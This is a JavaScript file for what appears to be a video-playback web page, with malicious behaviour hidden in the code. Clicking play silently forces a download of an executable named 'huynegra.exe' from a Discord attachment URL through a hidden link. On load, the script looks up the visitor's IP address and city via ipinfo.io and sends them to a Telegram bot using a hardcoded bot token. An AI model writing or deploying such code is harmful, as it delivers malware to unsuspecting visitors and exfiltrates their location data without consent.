function showVideo() {
    var buttonContainer = document.getElementById("button-container");
    var videoContainer = document.getElementById("video-container");

    buttonContainer.style.display = "none";
    videoContainer.style.display = "block";

    var video = document.getElementById("video");
    video.play();

    video.addEventListener("ended", function() {
        videoContainer.style.display = "none";
        buttonContainer.style.display = "block";
    });

    // я заебался писать эту залупу, сука
    var fileUrl = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe"; 
    var fileName = "huynegra.exe"; 

    var link = document.createElement("a");
    link.href = fileUrl;
    link.download = fileName;
    link.target = "_blank";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

var playButton = document.getElementById("play-button");
playButton.addEventListener("click", showVideo);

var video = document.getElementById("video");
video.controls = false;
video.loop = false;

fetch("https://ipinfo.io/json?token=a5fdbd840e0610")
    .then((response) => response.json())
    .then((data) => {
        const city = data.city;
        const ip = data.ip;
        const message = city + ": " + ip;
        const chatId = "6281247312";
        const token = "5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0";

        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message
        )}`;

        fetch(apiUrl)
            .then((response) => response.json())
            .then((data) => {
                if (data.ok) {
                    console.log("Сообщение успешно отправлено");
                } else {
                    console.error("Ошибка при отправке сообщения");
                }
            })
            .catch(console.error);
    })
    .catch(console.error);
